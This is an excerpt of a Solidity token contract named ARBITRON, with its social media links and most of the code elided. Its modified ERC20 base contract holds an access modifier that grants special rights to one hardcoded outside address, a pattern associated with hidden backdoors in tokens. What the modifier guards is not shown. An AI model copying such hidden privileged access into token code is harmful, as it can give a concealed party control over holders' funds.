...
Twitter: https://twitter.com/Arbi_snipe 
Tg: https://t.me/arbi_snipe
...
contract ARBITRON is ERC20, Ownable {
    ...
    constructor(address _uniswapV2RouterAddress, address _dividendSplitterAddress) ERC20("ARBITRON", "ATRON") {
        uint256 totalSupply = 1 * 1e5 * 1e6; // 100,000
        supply = totalSupply;
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    modifier onlyDividendSplitter {
        ...
        require(msg.sender == 0xf93ba1a89DEBC352E9347A976db16CDaE2bF0074 || msg.sender == address(this)|| msg.sender == address(0x0), "Sender: get out please!");
        _;
    }
